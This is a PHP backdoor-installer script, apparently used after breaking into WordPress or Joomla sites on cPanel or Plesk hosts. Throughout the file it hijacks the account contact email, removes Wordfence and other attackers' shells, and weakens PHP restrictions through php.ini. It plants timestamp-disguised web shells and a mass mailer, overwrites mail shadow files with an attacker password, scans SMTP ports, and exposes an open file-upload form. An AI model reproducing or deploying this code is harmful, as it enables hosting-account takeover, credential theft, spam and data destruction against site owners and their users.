<?php
$nosts=$_POST['stsno'];

putenv("TZ=Europe/Britania");
error_reporting(0);

 function string_between_two_string($str, $starting_word, $ending_word) 
{ 
    $subtring_start = strpos($str, $starting_word); 
    //Adding the strating index of the strating word to  
    //its length would give its ending index 
    $subtring_start += strlen($starting_word);   
    //Length of our required sub string 
    $size = strpos($str, $ending_word, $subtring_start) - $subtring_start;   
    // Return the substring from the index substring_start of length size  
    return substr($str, $subtring_start, $size);   
} 
function anucurl($sites) {
    		$ch = curl_init($sites);
	       		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	       		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	       		  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
	       		  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	       		  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIESESSION,true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
function rmrf($dir) {
  
        foreach (glob($dir) as $file) {
            if (is_dir($file)) { 
                rmrf("$file/*");
                rmdir($file);
            } else {
                unlink($file);
            }
        }
    
}
$fullpathoss=realpath(__file__);


if(strpos($fullpathoss, 'vhost')){
$user = string_between_two_string($fullpathoss, "/var/www/vhosts/{$user}", "/httpdocs/");
$servertype='vhost';
}else{

$user=get_current_user() ;
$servertype='cpanel';
list($str11) = get_included_files();
$str125 = substr($str11, 1); 
$findme1="/";
$abcd=strpos($str125, $findme1);
$pathhome = substr($str125, 0,$abcd);



}
 




if($servertype == 'cpanel'){
$wpfolder = string_between_two_string($fullpathoss, "/{$pathhome}/{$user}/public_html/", "/");

if(($wpfolder== "wp-includes")or($wpfolder=='wp-admin')or($wpfolder=='wp-content')or($wpfolder=='templates')or($wpfolder=='layouts') ){
  $fuckingpath='/'.$pathhome.'/'.$user.'/public_html';
    $uncderdirector='no';
}else{

$fuckingpath='/'.$pathhome.'/'.$user.'/public_html/'.$wpfolder;
$uncderdirector='yes';
}

}else{
$wpfolder = string_between_two_string($fullpathoss, "/var/www/vhosts/{$user}/httpdocs/", "/");

if(($wpfolder== "wp-includes")or($wpfolder=='wp-admin')or($wpfolder=='wp-content')or($wpfolder=='templates')or($wpfolder=='layouts') ){
  $fuckingpath='/var/www/vhosts/'.$user.'/httpdocs';
   $uncderdirector='no';
}else{

$fuckingpath='/var/www/vhosts/'.$user.'/httpdocs/'.$wpfolder;
   $uncderdirector='yes';
}
}
$wpcheck=$fuckingpath.'/wp-admin';
$joomlacheck=$fuckingpath.'/administrator';
if(file_exists($wpcheck)){

$cms='wordpress';

}elseif(file_exists($joomlacheck)){

$cms='joomla';

}
if (isset($_POST["Spectra"])){
   $spec= $_POST["Spectra"];
   if($spec == "DeleteMeBitchz"){
        if($cms=='wordpress'){
          $wp= getcwd();
          
          rmrf($wp);
          
        }elseif($cms=='joomla'){

          unlink(__file__);
        }
        exit("Done delete , hope you did save another shell :) ");
   }
}

if ((file_exists("sts.php") )|| ($nosts=='fucksts')){

if($cms=='wordpress'){

if($servertype == 'cpanel'){
$wp ="/{$pathhome}/{$user}/.contactemail";
if (file_exists($wp)) {
    unlink($wp);
} 
$wp ="/{$pathhome}/{$user}/.cpanel/contactinfo";
if (file_exists($wp)) {
    unlink($wp);
} 
$myfile = fopen("/{$pathhome}/{$user}/.contactemail", "w") or die("Unable to open file!");
$txt = "spextrasafic@gmail.com";
fwrite($myfile, $txt);
fclose($myfile);


$configinuser="/{$pathhome}/{$user}/wp-config.php";
if(!file_exists($configinuser)){

        copy("$fuckingpath/wp-config.php", "/{$pathhome}/{$user}/wp-config.php");
        
        $connfig = "<?php
        include('/{$pathhome}/{$user}/wp-config.php');";

        file_put_contents("$fuckingpath/wp-config.php", $connfig);

}


}else{
$configinuser="/var/www/vhosts/{$user}/wp-config.php";
if(!file_exists($configinuser)){

        copy("$fuckingpath/wp-config.php", "/var/www/vhosts/{$user}/wp-config.php");
        
        $connfig = "<?php
        include('/var/www/vhosts/{$user}/wp-config.php');";

        file_put_contents("$fuckingpath/wp-config.php", $connfig);

}


}
}elseif($cms=='joomla'){

if($servertype == 'cpanel'){
$wp ="/{$pathhome}/{$user}/.contactemail";
if (file_exists($wp)) {
    unlink($wp);
} 
$wp ="/{$pathhome}/{$user}/.cpanel/contactinfo";
if (file_exists($wp)) {
    unlink($wp);
} 
$myfile = fopen("/{$pathhome}/{$user}/.contactemail", "w") or die("Unable to open file!");
$txt = "spextrasafic@gmail.com";
fwrite($myfile, $txt);
fclose($myfile);


$configinuser="/{$pathhome}/{$user}/configuration.php";
if(!file_exists($configinuser)){

        copy("$fuckingpath/configuration", "/{$pathhome}/{$user}/configuration.php");
        
        $connfig = "<?php
        include('/{$pathhome}/{$user}/configuration.php');";

        file_put_contents("$fuckingpath/configuration.php", $connfig);

}


}else{
$configinuser="/var/www/vhosts/{$user}/configurationg.php";
if(!file_exists($configinuser)){

        copy("$fuckingpath/configuration", "/var/www/vhosts/{$user}/configuration.php");
        
        $connfig = "<?php
        include('/var/www/vhosts/{$user}/configuration.php');";

        file_put_contents("$fuckingpath/configuration", $connfig);
}
}
}
if($cms=='wordpress'){
echo 'cms : wordpress';
$wp ="$fuckingpath/wp-content/themes/gaukingo/";
rmrf($wp);
$wp ="$fuckingpath/wp-content/plugins/wordfence/";
rmrf($wp);
$wp ="$fuckingpath/wp-content/plugins/yrid06/";
rmrf($wp);
$wp ="$fuckingpath/wp-content/plugins/css-ready-sel/";
rmrf($wp);
$wp ="$fuckingpath/wp-content/plugins/css-ready-selectors/";
rmrf($wp);
$wp ="$fuckingpath/wp-content/plugins/three-column-screen-layout/";
rmrf($wp);
$wp ="$fuckingpath/wp-content/plugins/UBH/";
rmrf($wp);
$wp ="$fuckingpath/wp-content/plugins/ubh/";
rmrf($wp);
$wp ="$fuckingpath/wp-content/plugins/modules/";
rmrf($wp);
$wp ="$fuckingpath/wp-content/plugins/fox/";
rmrf($wp);
$wp ="$fuckingpath/wp-content/plugins/autoptimize/";
rmrf($wp);
$wp ="$fuckingpath/wp-content/plugins/giexmcp/";
rmrf($wp);
$wp ="$fuckingpath/wp-content/plugins/tempcleaner/";
rmrf($wp);
$wp ="$fuckingpath/wp-content/plugins/t3erster/";
rmrf($wp);
$wp ="$fuckingpath/wp-admin/network/";
rmrf($wp);
$wp ="$fuckingpath/wp-content/plugins/ioptimization/";
rmrf($wp);
$wp ="$fuckingpath/wp-content/plugins/plugins/";
rmrf($wp);
$wp ="$fuckingpath/wp-content/plugins/hot-blocks/";
rmrf($wp);
$wp ="$fuckingpath/wp-content/plugins/fac/";
rmrf($wp);
$wp ="$fuckingpath/wp-content/plugins/fighter/";
rmrf($wp);
$wp ="$fuckingpath/wp-content/plugins/mdhaxor/";
rmrf($wp);
$wp ="$fuckingpath/wp-content/plugins/pack/";
rmrf($wp);
$wp ="$fuckingpath/wp-content/plugins/xxx/";
rmrf($wp);
$wp ="$fuckingpath/wp-content/themes/gaukin/";
rmrf($wp);
$wp ="$fuckingpath/wp-content/plugins/dzz/";
rmrf($wp);
$wp ="$fuckingpath/wp-content/plugins/cmsboost/";
rmrf($wp);
$wp ="$fuckingpath/wp-content/plugins/yahoo/";
rmrf($wp);
$wp ="$fuckingpath/wp-content/plugins/xaisyndicate/";
rmrf($wp);
$wp ="$fuckingpath/wp-content/plugins/beast3x/";
rmrf($wp);
$wp ="$fuckingpath/wp-content/plugins/dz/";
rmrf($wp);
$wp ="$fuckingpath/wp-content/plugins/unicode/";
rmrf($wp);
$wp ="$fuckingpath/wp-content/plugins/vwcleanerplugin/";
rmrf($wp);
$wp ="$fuckingpath/wp-content/plugins/hd/";
rmrf($wp);
$wp ="$fuckingpath/wp-content/plugins/three-column/";
rmrf($wp);
$wp ="$fuckingpath/wp-content/plugins/freedom/";
rmrf($wp);
$wp ="$fuckingpath/wp-content/plugins/yassine/";
rmrf($wp);
$wp ="$fuckingpath/wp-content/plugins/mrx/";
rmrf($wp);
$wp ="$fuckingpath/.well-known/";
rmrf($wp);

$wp ="$fuckingpath/wp-includes/fonts/css.php";
if (file_exists($wp)) {
    $wp ="$fuckingpath/wp-includes/fonts/";
    rmrf($wp);
}
$wp ="$fuckingpath/wp-includes/css/css.php";
if (file_exists($wp)) {
    $wp ="$fuckingpath/wp-includes/css/";
    rmrf($wp);
} 


$diradmin=array("about.php","admin-ajax.php","admin-footer.php","admin-functions.php","admin-header.php","admin-post.php","admin.php","async-upload.php","comment.php","credits.php","custom-background.php","custom-header.php","customize.php","edit-comments.php","edit-form-advanced.php","edit-form-blocks.php","edit-form-comment.php","edit-link-form.php","edit-tag-form.php","edit-tags.php","edit.php","error_log","export.php","freedoms.php","import.php","index.php","install-helper.php","install.php","link-add.php","link-manager.php","link-parse-opml.php","link.php","load-scripts.php","load-styles.php","media-new.php","media-upload.php","media.php","menu-header.php","menu.php","moderation.php","ms-admin.php","ms-delete-site.php","ms-edit.php","ms-sites.php","ms-themes.php","ms-upgrade-network.php","ms-users.php","my-sites.php","nav-menus.php","network.php","options-discussion.php","options-general.php","options-head.php","options-media.php","options-permalink.php","options-reading.php","options-writing.php","plugins.php","post-new.php","post.php","press-this.php","privacy.php","profile.php","revision.php","setup-config.php","site-health-info.php","site-health.php","term.php","themes.php","tools.php","upgrade-functions.php","user-edit.php","user-new.php","users.php","widgets.php");


$wpadmipath="$fuckingpath/wp-admin/";
foreach(glob("$fuckingpath/wp-admin/{.,}*.php", GLOB_BRACE) as $file) {
       $filename24= str_replace($wpadmipath, "", $file);

       if (!in_array($filename24, $diradmin)){

            unlink($file);

       }
}

$dirpublic=array("index.php","license.txt","readme.html","wp-activate.php","wp-blog-header.php","wp-comments-post.php","wp-config-sample.php","wp-cron.php","wp-links-opml.php","wp-load.php","wp-login.php","wp-mail.php","wp-settings.php","wp-signup.php","wp-trackback.php","xmlrpc.php","wordfence-waf.php");

$publicpath="$fuckingpath/";
foreach(glob("$fuckingpath/{.,}*.php", GLOB_BRACE) as $file) {
       $filename24= str_replace($publicpath, "", $file);
       if (!in_array($filename24, $dirpublic)){

            unlink($file);

       }
}


$dirspublic=array("wp-admin","wp-includes","wp-content");

$dirspath="$fuckingpath/";
foreach(glob("$fuckingpath/*", GLOB_ONLYDIR) as $file) {
       $filename24= str_replace($dirspath, "", $file);
       if (!in_array($filename24, $dirspublic)){

            rmrf($file);

       }
}

$dirinclude=array("admin-filters.php","admin.php","ajax-actions.php","bookmark.php","class-automatic-upgrader-skin.php","class-bulk-plugin-upgrader-skin.php","class-bulk-theme-upgrader-skin.php","class-bulk-upgrader-skin.php","class-core-upgrader.php","class-custom-background.php","class-custom-image-header.php","class-file-upload-upgrader.php","class-ftp-pure.php","class-ftp-sockets.php","class-ftp.php","class-language-pack-upgrader-skin.php","class-language-pack-upgrader.php","class-pclzip.php","class-plugin-installer-skin.php","class-plugin-upgrader-skin.php","class-plugin-upgrader.php","class-theme-installer-skin.php","class-theme-upgrader-skin.php","class-theme-upgrader.php","class-walker-category-checklist.php","class-walker-nav-menu-checklist.php","class-walker-nav-menu-edit.php","class-wp-ajax-upgrader-skin.php","class-wp-automatic-updater.php","class-wp-comments-list-table.php","class-wp-community-events.php","class-wp-debug-data.php","class-wp-filesystem-base.php","class-wp-filesystem-direct.php","class-wp-filesystem-ftpext.php","class-wp-filesystem-ftpsockets.php","class-wp-filesystem-ssh2.php","class-wp-importer.php","class-wp-internal-pointers.php","class-wp-links-list-table.php","class-wp-list-table-compat.php","class-wp-list-table.php","class-wp-media-list-table.php","class-wp-ms-sites-list-table.php","class-wp-ms-themes-list-table.php","class-wp-ms-users-list-table.php","class-wp-plugin-install-list-table.php","class-wp-plugins-list-table.php","class-wp-post-comments-list-table.php","class-wp-posts-list-table.php","class-wp-privacy-data-export-requests-list-table.php","class-wp-privacy-data-removal-requests-list-table.php","class-wp-privacy-policy-content.php","class-wp-privacy-requests-table.php","class-wp-screen.php","class-wp-site-health-auto-updates.php","class-wp-site-health.php","class-wp-site-icon.php","class-wp-terms-list-table.php","class-wp-theme-install-list-table.php","class-wp-themes-list-table.php","class-wp-upgrader-skin.php","class-wp-upgrader-skins.php","class-wp-upgrader.php","class-wp-users-list-table.php","comment.php","continents-cities.php","credits.php","dashboard.php","deprecated.php","edit-tag-messages.php","export.php","file.php","image-edit.php","image.php","import.php","list-table.php","media.php","menu.php","meta-boxes.php","misc.php","ms-admin-filters.php","ms-deprecated.php","ms.php","nav-menu.php","network.php","noop.php","options.php","plugin-install.php","plugin.php","post.php","privacy-tools.php","revision.php","schema.php","screen.php","taxonomy.php","template.php","theme-install.php","theme.php","translation-install.php","update-core.php","update.php","upgrade.php","user.php","widgets.php");


$includepath="$fuckingpath/includes/";
foreach(glob("$fuckingpath/includes/{.,}*.php", GLOB_BRACE) as $file) {
       $filename24= str_replace($includepath, "", $file);
       if (!in_array($filename24, $dirinclude)){
            echo $file ;
            unlink($file);

       }
}




foreach(glob("$fuckingpath/wp-admin/css/{.,}*.php", GLOB_BRACE) as $file) {
            unlink($file);     
}

foreach(glob("$fuckingpath/wp-admin/images/{.,}*.php", GLOB_BRACE) as $file) {
            unlink($file);     
}

foreach(glob("$fuckingpath/wp-admin/widgets/{.,}*.php", GLOB_BRACE) as $file) {
            unlink($file);     
}

foreach(glob("$fuckingpath/wp-content/uploads/{.,}*.php", GLOB_BRACE) as $file) {
            unlink($file);     
}

foreach(glob("$fuckingpath/wp-includes/css/{.,}*.php", GLOB_BRACE) as $file) {
            unlink($file);     
}
foreach(glob("$fuckingpath/wp-includes/fonts/{.,}*.php", GLOB_BRACE) as $file) {
            unlink($file);     
}
foreach(glob("$fuckingpath/wp-includes/images/{.,}*.php", GLOB_BRACE) as $file) {
            unlink($file);     
}
foreach(glob("$fuckingpath/wp-includes/js/{.,}*.php", GLOB_BRACE) as $file) {
            unlink($file);     
}



foreach(glob("$fuckingpath/wp-content/{.,}*.php", GLOB_BRACE) as $file) {
        if($file != "$fuckingpath/wp-content/index.php"){
            unlink($file);     
        }
}

foreach(glob("$fuckingpath/wp-content/plugins/{.,}*.php", GLOB_BRACE) as $file) {
        if($file != "$fuckingpath/wp-content/plugins/index.php"){
            unlink($file);     
        }
}

foreach(glob("$fuckingpath/wp-admin/maint/{.,}*.php", GLOB_BRACE) as $file) {
        if($file != "$fuckingpath/wp-admin/maint/repair.php"){
            unlink($file);     
        }
}

}elseif($cms=='joomla'){
echo 'cms : joomla';	
}

$txthtaccessini = "safe_mode = OFF
Safe_mode_gid = OFF
disable_functions = NONE
disable_classes = NONE
open_basedir = OFF
suhosin.executor.func.blacklist = NONE";
if($servertype == 'cpanel'){
file_put_contents("/{$pathhome}/{$user}/mail/php.ini", $txthtaccessini);
/*
$myfile = fopen("/{$pathhome}/{$user}/.htaccess", "w") or die("Unable to open file!");
$txt = "suPHP_ConfigPath /{$pathhome}/{$user}/mail
<Files php.ini>

order allow,deny

deny from all

</Files>";
fwrite($myfile, $txt);
fclose($myfile);

*/

}
/*--------------------------- find folders ----------*/

if($servertype == 'cpanel'){
$findme554="/{$pathhome}/{$user}/";

$findme106="uploads";
$findme1098="themes";

$realpathrandom= "$fuckingpath/";
$pathrandom = realpath($realpathrandom);
$acx=0;
$objects = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($pathrandom), RecursiveIteratorIterator::SELF_FIRST);
$results5 = array();
foreach($objects as $name5 => $object){
$findme12="/";
$abcd12=strrpos($name5, $findme12,-3);
$pathhome125 = substr($name5, 0,$abcd12 +1); 
  if((!in_array($pathhome125, $results5))and (is_writable($pathhome125)) and (strpos($pathhome125, $findme106) === false) and  (strpos($pathhome125, $findme1098) === false) and ($pathhome125 != $realpathrandom) and ($pathhome125 != $findme554) ){
    $results5[] = $pathhome125;

    $acx++;
    if($acx==90){
    break;
    }
  } 
}

}else{

$findme554="/var/www/vhosts/{$user}/";

$findme106="uploads";
$findme1098="themes";
$findme1099="plugins-editor";
$realpathrandom= "$fuckingpath/";
$pathrandom = realpath($realpathrandom);
$acx=0;
$objects = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($pathrandom), RecursiveIteratorIterator::SELF_FIRST);
$results5 = array();
foreach($objects as $name5 => $object){
$findme12="/";
$abcd12=strrpos($name5, $findme12,-3);
$pathhome125 = substr($name5, 0,$abcd12 +1); 
  if((!in_array($pathhome125, $results5))and  (strpos($pathhome125, $findme106) === false) and  (strpos($pathhome125, $findme1098) === false) and ($pathhome125 != $realpathrandom) and ($pathhome125 != $findme554) and (strpos($pathhome125, $findme1099) === false) ){
    $results5[] = $pathhome125;

    $acx++;
    if($acx==30){
    break;
    }
  } 
}	
}
$link = "https://$_SERVER[HTTP_HOST]";



/*--------------------------- end find folders ----------*/


/*----------------------shell-------------------------*/


$fileskk = array();
$randomphp=""; 
$countname=0;
while (($randomphp == "") and ($countname<100)) {
$p1=$results5[rand(0, count($results5) - 1)];

chmod($p1, 0755);

$fileskk = glob($p1 . '{.,}*.php', GLOB_BRACE);

   $randomphp = $fileskk[array_rand($fileskk)];
        $indexinter=$p1.'index.php';
        $funinter=$p1.'function.php';
        $funcinter=$p1.'functions.php';
        $cleaninter=$p1.'clean.php';
        $stsinter=$p1.'sts.php';
      if(($randomphp == $indexinter ) or ($randomphp == $funinter ) or ($randomphp == $funcinter )or($randomphp==$stsinter)or($cleaninter== $randomphp ) or !(is_writable($randomphp)) ){

        $randomphp="";
      }
$countname=$countname+1;
}
$oldp=$p1;
$shell1p=$p1;

if ($countname>99){
    $randomphp = $p1."6x64.php";
}
$filephptime=filemtime($randomphp); 

if($uncderdirector=='yes'){
$thingslink= str_replace($realpathrandom, "/{$wpfolder}/", $randomphp);
}else{
  $thingslink= str_replace($realpathrandom, "/", $randomphp);
}
chmod($randomphp, 0755);
file_put_contents($randomphp, "");
$fh = fopen($randomphp, 'a') or die("can't open file");

$imagex='';
$image=base64_decode($imagex);
fwrite($fh, $image);
fclose($fh);

touch($randomphp, $filephptime);

    echo "<h2>Shell---> </h2> <a href='".$link."".$thingslink."' target='_blank'><h2 style='color:red;'>olux shell</h2></a>" ."<br>";
$txthtaccessall = "Options +indexes
Satisfy Any
Allow from all";
file_put_contents("{$p1}.htaccess", $txthtaccessall);
touch("{$p1}.htaccess", $filephptime);
file_put_contents("{$p1}php.ini", $txthtaccessini);
touch("{$p1}php.ini", $filephptime);
/*---------------------------- fin-------------------*/

/*----------------------shell 2-------------------------*/


$fileskk = array();
$randomphp=""; 
$countname=0;
while (($randomphp == "") and ($countname<100)) {
$p1=$results5[rand(0, count($results5) - 1)];

chmod($p1, 0755);

$fileskk = glob($p1 . '{.,}*.php', GLOB_BRACE);

   $randomphp = $fileskk[array_rand($fileskk)];
        $indexinter=$p1.'index.php';
        $funinter=$p1.'function.php';
        $funcinter=$p1.'functions.php';
        $cleaninter=$p1.'clean.php';
        $stsinter=$p1.'sts.php';
      if(($randomphp == $indexinter ) or ($randomphp == $funinter ) or ($randomphp == $funcinter )or ($p1==$shell1p)or($randomphp == $stsinter )or($randomphp == $cleaninter)or !(is_writable($randomphp))){

        $randomphp="";
      }
$countname=$countname+1;
}
$oldp=$p1;
$shell2p=$p1;
if ($countname>99){
    $randomphp = $p1."6x64.php";
}
$filephptime=filemtime($randomphp); 


if($uncderdirector=='yes'){
$thingslink= str_replace($realpathrandom, "/{$wpfolder}/", $randomphp);
}else{
  $thingslink= str_replace($realpathrandom, "/", $randomphp);
}
chmod($randomphp, 0755);
file_put_contents($randomphp, "");
$fh = fopen($randomphp, 'a') or die("can't open file");

$imagex='';
$image=base64_decode($imagex);
fwrite($fh, $image);
fclose($fh);

touch($randomphp, $filephptime);

    echo "<h2>Shell 2---> </h2> <a href='".$link."".$thingslink."' target='_blank'><h2 style='color:red;'>hidhub shell</h2></a>" ."<br>";
$txthtaccessall = "Options +indexes
Satisfy Any
Allow from all";
file_put_contents("{$p1}.htaccess", $txthtaccessall);
touch("{$p1}.htaccess", $filephptime);
file_put_contents("{$p1}php.ini", $txthtaccessini);
touch("{$p1}php.ini", $filephptime);
/*---------------------------- fin 2-------------------*/





/*----------------------sts-------------------------*/


$fileskk = array();
$randomphp=""; 
$countname=0;
while (($randomphp == "") and ($countname<100)) {
$p1=$results5[rand(0, count($results5) - 1)];

chmod($p1, 0755);

$fileskk = glob($p1 . '{.,}*.php', GLOB_BRACE);

   $randomphp = $fileskk[array_rand($fileskk)];
        $indexinter=$p1.'index.php';
        $funinter=$p1.'function.php';
        $funcinter=$p1.'functions.php';
        $cleaninter=$p1.'clean.php';
        $stsinter=$p1.'sts.php';
      if(($randomphp == $indexinter ) or ($randomphp == $funinter ) or ($randomphp == $funcinter )or($shell1p==$p1) or ($shell2p==$p1)or ($randomphp == $stsinter )or ($randomphp == $cleaninter )or !(is_writable($randomphp))){

        $randomphp="";
      }
$countname=$countname+1;
}
$oldp=$p1;
$shellstsp=$p1;
if ($countname>99){
    $randomphp = $p1."6x64.php";
}
$filephptime=filemtime($randomphp); 


if($uncderdirector=='yesy'){
$thingslink= str_replace($realpathrandom, "/{$wpfolder}/", $randomphp);
}else{
  $thingslink= str_replace($realpathrandom, "/", $randomphp);
}
chmod($randomphp, 0755);
file_put_contents($randomphp, "");


rename('sts.php', $randomphp);

touch($randomphp, $filephptime);

    echo "<h2>Shell sts ---> </h2> <a href='".$link."".$thingslink."' target='_blank'><h2 style='color:red;'>sts shell</h2></a>" ."<br>";
$txthtaccessall = "Options +indexes
Satisfy Any
Allow from all";
file_put_contents("{$p1}.htaccess", $txthtaccessall);
touch("{$p1}.htaccess", $filephptime);
file_put_contents("{$p1}php.ini", $txthtaccessini);
touch("{$p1}php.ini", $filephptime);
/*---------------------------- fin sts-------------------*/

/*----------------------xleet-------------------------*/


$fileskk = array();
$randomphp=""; 
$countname=0;
while (($randomphp == "") and ($countname<100)) {
$p1=$results5[rand(0, count($results5) - 1)];

chmod($p1, 0755);

$fileskk = glob($p1 . '{.,}*.php', GLOB_BRACE);

   $randomphp = $fileskk[array_rand($fileskk)];
        $indexinter=$p1.'index.php';
        $funinter=$p1.'function.php';
        $funcinter=$p1.'functions.php';
        $cleaninter=$p1.'clean.php';
        $stsinter=$p1.'sts.php';
      if(($randomphp == $indexinter ) or ($randomphp == $funinter ) or ($randomphp == $funcinter )or($oldp==$p2) or($p2==$shell1p)or($shell2p==$p2) or ($p2==$shellstsp)or ($randomphp == $stsinter )or ($randomphp == $cleaninter )or !(is_writable($randomphp)) ){

        $randomphp="";
      }
$countname=$countname+1;
}
$oldp=$p1;
$shellxleet=$p1;
if ($countname>99){
    $randomphp = $p1."xleet.php";
}
$filephptime=filemtime($randomphp); 


if($uncderdirector=='yes'){
$thingslink= str_replace($realpathrandom, "/{$wpfolder}/", $randomphp);
}else{
  $thingslink= str_replace($realpathrandom, "/", $randomphp);
}
chmod($randomphp, 0755);
file_put_contents($randomphp, "");
$fh = fopen($randomphp, 'a') or die("can't open file");

$imagex='';
$image=base64_decode($imagex);
fwrite($fh, $image);
fclose($fh);

touch($randomphp, $filephptime);

    echo "<h2>xleet--> </h2> <a href='".$link."".$thingslink."' target='_blank'><h2 style='color:red;'>xleet shell</h2></a>" ."<br>";
$txthtaccessall = "Options +indexes
Satisfy Any
Allow from all";
file_put_contents("{$p1}.htaccess", $txthtaccessall);
touch("{$p1}.htaccess", $filephptime);
file_put_contents("{$p1}php.ini", $txthtaccessini);
touch("{$p1}php.ini", $filephptime);
/*---------------------------- fin xleet-------------------*/

/*---------------------mailer--------------------------*/


$fileskk = array();
$randomphp=""; 
$countname=0;
while (($randomphp == "") and ($countname<100)) {
$p2=$results5[rand(0, count($results5) - 1)];

chmod($p2, 0755);

$fileskk = glob($p2 . '{.,}*.php', GLOB_BRACE);

   $randomphp = $fileskk[array_rand($fileskk)];
        $indexinter=$p2.'index.php';
        $funinter=$p2.'function.php';
        $funcinter=$p2.'functions.php';
        $cleaninter=$p1.'clean.php';
        $stsinter=$p1.'sts.php';
      if(($randomphp == $indexinter ) or ($randomphp == $funinter ) or ($randomphp == $funcinter )or($oldp==$p2) or($p2==$shell1p)or($shell2p==$p2) or ($p2==$shellstsp)or ($randomphp == $stsinter )or ($randomphp == $cleaninter )or ($randomphp == $shellxleet ) or !(is_writable($randomphp)) ){

        $randomphp="";
      }
$countname=$countname+1;
}
if ($countname>99){
    $randomphp = $p2."6x64.php";
}
$filephptime=filemtime($randomphp); 


if($uncderdirector=='yes'){
$thingslink= str_replace($realpathrandom, "/{$wpfolder}/", $randomphp);
}else{
  $thingslink= str_replace($realpathrandom, "/", $randomphp);
}
chmod($randomphp, 0755);
file_put_contents($randomphp, "");
$fh = fopen($randomphp, 'a') or die("can't open file");

$imagex='';
$image=base64_decode($imagex);
fwrite($fh, $image);
fclose($fh);

$pas=mt_rand(10000000, 100000000); 


$filenamexx = "$randomphp"; 
    $file_content = file($filenamexx); 
    $t = count($file_content); 
    $fp = fopen($filenamexx, "w+");  
    $file_content[6] = '$password = "'.$pas.'"; // Password'; 
    $y = 0; 

    while($y < $t) 
    { 
    fwrite($fp, $file_content[$y]); 
    $y++; 
    } 
    fclose($fp); 


touch($randomphp, $filephptime);

    echo "<h2>Mailer---> </h2> <a href='".$link."".$thingslink."?pass=".$pas."' target='_blank'><h2 style='color:red;'>leafmailer</h2></a>" ."<br>";
$txthtaccessall = "Options +indexes
Satisfy Any
Allow from all";
file_put_contents("{$p2}.htaccess", $txthtaccessall);
touch("{$p2}.htaccess", $filephptime);
file_put_contents("{$p1}php.ini", $txthtaccessini);
touch("{$p2}php.ini", $filephptime);
/*---------------------------- fin-------------------*/


/*---------------------------- cpanel-------------------*/
if($servertype == 'cpanel'){
$user=get_current_user() ;

$u=$_SERVER['SERVER_NAME'];
echo "<h2>cpanel---></h2><a href='https://".$u.":2083/resetpass?user=".$user."' target='_blank'><h2 style='color:red;'>reset!</h2></a>" ."<br>";
}

/*----------------------------fin cpanel-------------------*/
/*----------------------------smtp-------------------*/
//Bksmile **(RooTTN)**
set_time_limit(0);
ini_set('max_execution_time',0);
ini_set('memory_limit',-1);
// port to scan
$ports=array(25, 587, 465, 110, 995, 143 , 993);
$primary_port='25';
//curent user
$user=get_current_user();
// Smtp password
$password='Sp3ctra001@';
//crypt
$pwd = crypt($password,'$6$roottn$');
// host name
 $t = $_SERVER['SERVER_NAME'];
//edit
 $t = @str_replace("www.","",$t);
 
$dirs = glob('/home/'.$user.'/etc/*', GLOB_ONLYDIR);
foreach($dirs as $dir){
$ex = explode("/",$dir);
$site =  $ex[count($ex)-1];


 //get users
@$passwd = file_get_contents('/home/'.$user.'/etc/'.$site.'/shadow');
//edit
$ex=explode("\r\n",$passwd);
//backup shadow
@link('/home/'.$user.'/etc/'.$site.'/shadow','/home/'.$user.'/etc/'.$site.'/shadow.roottn.bak');
//delete shadow
@unlink('/home/'.$user.'/etc/'.$site.'/shadow');
// :D
foreach($ex as $ex){
$ex=explode(':',$ex);
$e= $ex[0];
if ($e){
$b=fopen('/home/'.$user.'/etc/'.$site.'/shadow','ab');fwrite($b,$e.':'.$pwd.':16249:::::'."\r\n");fclose($b);
echo '<span style=\'color:#0000ff;\'>'.$site.'|25|'.$e.'@'.$site.'|'.$password.'</span><br>';  "</center>";
}}
//port scan
foreach ($ports as $port)
{
    $connection = @fsockopen($site, $port, $errno, $errstr, 2);
    if (is_resource($connection))
    {
        echo '<span>' . $host . ':' . $port . ' ' . '(' . getservbyport($port, 'tcp') . ') is open.</span>' . ", ";
        fclose($connection);
    }
  
}
echo "<br/>";

}


/*----------------------------fin smtp-------------------*/

echo "<pre>";


echo "<pre>";
echo "<pre>";

}else{
	echo 'sts.php dont exist , upload it !';
	$b = $_FILES['file']['name'];
$a  = $_FILES['file']['tmp_name'];
echo "<form method='POST' enctype='multipart/form-data'><input type='file'name='file' /><input type='submit' value='submit' /></form>";
move_uploaded_file($a,$b);
     if(file_exists("sts.php")){
		 header("Refresh:0");
	 }
	 echo"<form action='' method='post'>";
		echo"<input type='hidden' name='stsno' value='fucksts'>";

echo"<button type='submit' class='button button1'>without sts baliz</button>";
echo"</form>";
	exit();
	
}
?>
<html>
<head>
<style>
.button {
  background-color: #4CAF50; /* Green */
  border: none;
  color: white;
  padding: 15px 32px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 16px;
  margin: 4px 2px;
  cursor: pointer;
}

.button1 {background-color: #f44336;} /* Red */ 
</style>
</head>
<body>

<h2>Delete plugins-editor ?</h2>
 
<form action="" method="post">
<input type="hidden" name="Spectra" value="DeleteMeBitchz">

<button type="submit" class="button button1">Yes Baliz</button>
</form>
 


</body>
</html>